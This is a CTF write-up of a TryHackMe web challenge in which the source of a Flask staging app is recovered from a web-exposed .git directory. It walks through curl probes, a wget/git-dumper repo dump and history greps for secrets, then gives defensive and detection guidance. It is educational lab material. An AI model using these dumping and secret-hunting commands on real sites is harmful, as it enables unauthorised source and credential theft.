## CTF Writeup — "The Quiet Room" Exposed .git (TryHackMe)
### TryHackMe · Hacker Holidays · Web · Very Easy (30 pts) · dumping source from a web-exposed .git directory

**Flag:** `THM{REDACTED}`

---

## TL;DR

A staging build of a Flask app was deployed with its `.git/` directory
web-accessible. That exposes the entire source tree — and its history — to anyone
who requests it. The flag sits in `README.md`, tagged "remove before launch":
staging content that shipped to production. Path from nothing to flag: three
requests.

---

## The attack chain

```
curl -I the site  →  Server: Werkzeug/Python  →  it's a Flask app
        │
        ▼
Enumerate paths  →  /.git/config returns 200 (everything else 404)
        │  (an exposed .git means the whole repo is reconstructable)
        ▼
Confirm it's a real repo (/.git/config + /.git/HEAD)
        │
        ▼
Dump it: wget -r the .git dir  →  git checkout -- .   (or git-dumper)
        │
        ▼
grep the source for the flag  →  README.md  →  FLAG
```

---

## Background: why an exposed .git is game over

When developers use Git, every repository has a hidden `.git/` folder holding the
**complete source code and its entire history** — every version of every file,
including ones that were later deleted.

That folder is meant to stay on the developer's machine or a private server. If a
site is deployed by copying the whole project folder (including `.git/`) into the
web root, then `.git/` becomes downloadable over HTTP. An attacker can reconstruct
the full application source — often finding passwords, API keys, and secret logic
that were never meant to be public, plus files that were "deleted" but still live
in history.

## Step 1 — Fingerprint the server

```bash
curl -sI http://$IP:8080/
```

- `-s` silent, `-I` headers-only. The response header:

```
Server: Werkzeug/3.0.1 Python/3.12.3
```

`Werkzeug` is the development server behind **Flask** (a Python web framework).
That tells us the source we're after is `app.py`-style Python, and to look for
exposed VCS metadata — this shaped the whole approach.

## Step 2 — Enumerate paths

A quick sweep of likely paths (appropriate for a "very easy" box). Everything
returned `404` **except** one:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://$IP:8080/.git/config
# 200
```

- `-o /dev/null` throws away the body, `-w "%{http_code}"` prints just the status.
- **200** on `/.git/config` = the git directory is exposed. That single response
  is the entire finding.

## Step 3 — Confirm it's a real repository

```bash
curl -s http://$IP:8080/.git/config
curl -s http://$IP:8080/.git/HEAD
```

```
[core]
	repositoryformatversion = 0
	...
ref: refs/heads/main
```

A valid `[core]` block and a `HEAD` pointing at a branch — a genuine working repo,
not a coincidental 200.

## Step 4 — Dump the source

The clean tool for this is `git-dumper`, but it wasn't installable here. Manual
fallback — the dev server serves the raw `.git` files, so mirror them and let git
rebuild the working tree from the downloaded object store:

```bash
mkdir loot && cd loot && git init -q
wget -r -np -nH "http://$IP:8080/.git/"
git checkout -- .
```

- `wget -r` recursively downloads the `.git/` directory.
  - `-np` = don't ascend to parent directories, `-nH` = don't create a hostname
    folder.
- `git checkout -- .` tells git to materialise the working files from the objects
  it just downloaded.

(Preferred when available: `git-dumper http://$IP:8080/.git/ ./loot`.)

## Step 5 — Find the flag

```bash
grep -rIE 'THM\{|flag' .
```

- `grep -r` searches recursively, `-I` skips binary files, `-E` enables regex.

```
./README.md:Staging flag (remove before launch): THM{REDACTED}
```

In a tracked file — no history-digging needed. If it hadn't been in the working
tree, the next moves would search *deleted* content too:

```bash
git log --all --oneline
git log --all -p | grep -iE 'THM\{|flag|secret'   # searches removed lines
```

A secret committed and later deleted still lives in history — a very common form
of this challenge.

---

## Root cause

- **`.git/` served as static content** — the deploy copied the working tree
  (including `.git/`) into the web root, exposing the whole repo and its history.
- **Flask dev server in production** — Werkzeug's server isn't a production server;
  "build staging" in the page footer confirms a non-prod build was shipped live.
- **Secret committed to the repo** — even with a "remove before launch" note, the
  flag was in version control, hence in history regardless of later edits.

## Defensive takeaways

- **Deploy build artifacts, not the working tree.** Never `git clone` into a
  webroot. Block dotfiles at the web server: `location ~ /\.git { deny all; }`.
- **Run behind a real WSGI server** (gunicorn/uWSGI) + reverse proxy; never
  `debug=True` in production.
- **Keep secrets out of version control** — use env vars / secret stores,
  `.gitignore` them, scan repos with gitleaks/trufflehog in CI, and rotate anything
  that ever touched history.
- **Separate staging from production** so staging markers and test data never ship.

## Detection opportunities

- **Web-log alert on requests for `/.git/`, `/.svn/`, `/.env`** and other dotfiles
  — near-zero legitimate traffic, high-signal for source-disclosure scanning.
- **The dump access pattern** is a burst of sequential requests for
  `.git/objects/**` — a clean signature (git-dumper / `wget -r`).
- **Repo secret-scanning in CI** (gitleaks) catches the flag-in-README class before
  it ever deploys.

## Command cheat-sheet

```
# fingerprint
curl -sI http://$IP:8080/

# check for exposed git
curl -s http://$IP:8080/.git/config
curl -s http://$IP:8080/.git/HEAD

# dump (manual)
mkdir loot && cd loot && git init -q
wget -r -np -nH "http://$IP:8080/.git/"
git checkout -- .
# dump (tool)  →  git-dumper http://$IP:8080/.git/ ./loot

# find the flag (incl. deleted history)
grep -rIE 'THM\{|flag' .
git log --all -p | grep -iE 'THM\{|flag|secret'
```

## Two things worth remembering

1. **A 200 on `/.git/config` is a full source-code leak.** One request tells you
   the entire application — and its history — is downloadable.
2. **"Deleting" a secret from a repo doesn't remove it.** Git keeps history; a
   secret must be rotated, not just edited out.

*Scope: THM-provisioned target, worked from the THM attackbox inside their network.
Target is fictional challenge material.*
